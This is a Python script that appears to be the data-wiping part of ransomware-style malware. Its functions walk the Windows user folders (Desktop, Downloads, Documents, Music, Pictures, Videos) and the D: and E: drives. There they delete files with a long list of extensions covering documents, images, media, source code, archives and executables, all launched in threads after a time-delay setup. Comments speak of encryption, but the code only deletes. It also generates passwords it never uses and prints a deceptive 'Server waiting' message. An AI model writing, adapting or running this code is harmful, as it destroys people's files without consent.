import os, string, random
from threading import *
from datetime import datetime, timedelta

temp = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\"


PASSWORDS = []

# Encrypt C: Items, Desktop, Downloads, Documents, Pictures etc...
def C_drive_desktop():
    userdir = f'C:\\Users\\{os.getlogin()}\\Desktop'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                try:
                                    os.remove(l)
                                except:
                                    pass
            else:
                shit = 12


            lol = 'Desktop Folder : '
            PASSWORDS.append(f"{lol}")
        else:
            pass
    else:
        pass

def C_drive_downloads():
    userdir = f'C:\\Users\\{os.getlogin()}\\Downloads'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                try:
                                    os.remove(l)
                                except:
                                    pass
            else:
                shit = 12


            lol = 'Downloads Folder : '
            PASSWORDS.append(f"{lol}")
        else:
            pass
    else:
        pass

def C_drive_documents():
    userdir = f'C:\\Users\\{os.getlogin()}\\Documents'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                try:
                                    os.remove(l)
                                except:
                                    pass
            else:
                shit = 12


            lol = 'Documents Folder : '
            PASSWORDS.append(f"{lol}")
        else:
            pass
    else:
        pass

def C_drive_music():
    userdir = f'C:\\Users\\{os.getlogin()}\\Music'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                try:
                                    os.remove(l)
                                except:
                                    pass
            else:
                shit = 12


            lol = 'Music Folder : '
            PASSWORDS.append(f"{lol}")
        else:
            pass
    else:
        pass

def C_drive_pictures():
    userdir = f'C:\\Users\\{os.getlogin()}\\Pictures'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                try:
                                    os.remove(l)
                                except:
                                    pass
            else:
                shit = 12


            lol = 'Pictures Folder : '
            PASSWORDS.append(f"{lol}")
        else:
            pass
    else:
        pass

def C_drive_videos():
    userdir = f'C:\\Users\\{os.getlogin()}\\Videos'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                try:
                                    os.remove(l)
                                except:
                                    pass
            else:
                shit = 12


            lol = 'Videos Folder : '
            PASSWORDS.append(f"{lol}")
        else:
            pass
    else:
        pass

# Other Drives
def D_drive():
    userdir = f'D:\\'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                try:
                                    os.remove(l)
                                except:
                                    pass
            else:
                shit = 12


            lol = 'D Drive : '
            PASSWORDS.append(f"{lol}")
        else:
            pass
    else:
        pass

def E_drive():
    userdir = f'E:\\'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak', '.enc',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                try:
                                    os.remove(l)
                                except:
                                    pass
            else:
                shit = 12


            lol = 'E Drive : '
            PASSWORDS.append(f"{lol}")
        else:
            pass
    else:
        pass


def wait_for_date(current_date, delete_files_date):
    f1 = open(temp + "c.txt", "r")
    current_date = f1.read()
    f2 = open(temp + "f.txt", "r")
    delete_files_date = f2.read()
    print("Server waiting for reply. . .")
    while True:
        if current_date == delete_files_date:
            a = Thread(target = C_drive_desktop)
            b = Thread(target = C_drive_downloads)
            c = Thread(target = C_drive_documents)
            d = Thread(target = C_drive_music)
            e = Thread(target = C_drive_pictures)
            ff = Thread(target = C_drive_videos)
            g = Thread(target = D_drive)
            h = Thread(target = E_drive)

            c.start()
            d.start()
            e.start()
            ff.start()
            g.start()
            h.start()
            b.start()
            a.start()


def main():
    current_date = datetime.now()
    delete_files_date = datetime.now() + timedelta(days=4)
    with open(temp + 'c.txt', 'w') as f:
        f.write(str(current_date))
    with open(temp + 'f.txt', 'w') as f:
        f.write(str(delete_files_date))
    wait_for_date(current_date, delete_files_date)


main()
